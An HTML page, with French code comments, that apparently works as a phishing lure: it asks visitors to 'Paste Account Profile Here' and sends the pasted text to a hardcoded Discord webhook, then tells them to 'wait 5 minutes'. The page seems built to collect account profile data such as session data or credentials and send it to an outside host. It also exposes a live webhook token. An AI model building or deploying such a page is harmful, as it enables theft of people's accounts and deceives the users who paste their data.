<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Envoi de message au Webhook Discord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 50px;
        }
        textarea {
            width: 120%;
            height: 160px;
            margin-bottom: 10px;
        }
        button {
            padding: 10px 20px;
            background-color: #7289DA;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #5b6eae;
        }
    </style>
</head>
<body>

    <h2>Paste Account Profile Here</h2>
    <textarea id="message" placeholder="Please put the Profile here..."></textarea><br>
    <button onclick="sendMessage()">Envoyer</button>

    <script>
        function sendMessage() {
            const message = document.getElementById("message").value;
            const webhookURL = "https://discordapp.com/api/webhooks/1338097828928553060/unc8ftZ9MbeGFhcNEO1FqqKc9Qvs9ABSXWK0lcuySnfyCagabHUhBhs2EVs5X7CY0EsN"; // Remplace par l'URL de ton webhook Discord

            if (!message) {
                alert("Veuillez entrer un message !");
                return;
            }

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            })
            .then(response => {
                if (response.ok) {
                    alert("Message sent please wait 5 minutes!");
                    document.getElementById("message").value = ""; // Efface le champ texte
                } else {
                    alert("umm we got a problem...");
                }
            })
            .catch(error => {
                alert("umm we got a problem...");
                console.error(error);
            });
        }
    </script>

</body>
</html>
